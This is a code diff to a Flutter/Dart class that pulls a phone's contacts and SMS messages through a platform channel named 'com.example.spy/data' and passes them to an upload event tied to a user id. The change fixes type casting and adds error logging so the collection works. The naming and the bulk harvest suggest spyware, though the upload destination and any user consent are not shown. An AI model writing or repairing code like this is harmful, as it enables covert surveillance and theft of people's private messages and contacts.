@@ -15,24 +15,38 @@ class ContactSmsBloc extends Bloc<ContactSmsEvent, ContactSmsState> {
     emit(ContactSmsLoading());
     try {
       const platform = MethodChannel("com.example.spy/data");
-      final result = await platform.invokeMethod<Map>("getContactsAndSms");
+      final result = await platform.invokeMethod<Map<dynamic, dynamic>>(
+        "getContactsAndSms",
+      );
 
       if (result != null) {
-        final contacts = List<Map<String, dynamic>>.from(result["contacts"]);
-        final smsList = List<Map<String, dynamic>>.from(result["sms"]);
+        final contacts = (result["contacts"] as List<dynamic>)
+            .cast<Map<dynamic, dynamic>>();
+        final smsList = (result["sms"] as List<dynamic>)
+            .cast<Map<dynamic, dynamic>>();
+
+        final convertedContacts = contacts
+            .map((contact) => Map<String, dynamic>.from(contact))
+            .toList();
+
+        final convertedSms = smsList
+            .map((sms) => Map<String, dynamic>.from(sms))
+            .toList();
 
         add(
           UploadContactAndSms(
-            contacts: contacts,
-            smsList: smsList,
+            contacts: convertedContacts,
+            smsList: convertedSms,
             uid: event.uid,
           ),
         );
       } else {
         emit(ContactSmsError("Failed to get data"));
+        print("No data received from platform channel.");
       }
     } catch (e) {
       emit(ContactSmsError(e.toString()));
+      print("Error in _onLoadData: $e");
     }
   }
 
@@ -62,6 +76,7 @@ class ContactSmsBloc extends Bloc<ContactSmsEvent, ContactSmsState> {
       emit(ContactSmsUploaded());
     } catch (e) {
       emit(ContactSmsError(e.toString()));
+      print("Error in _onUploadData: $e");
     }
   }
 }
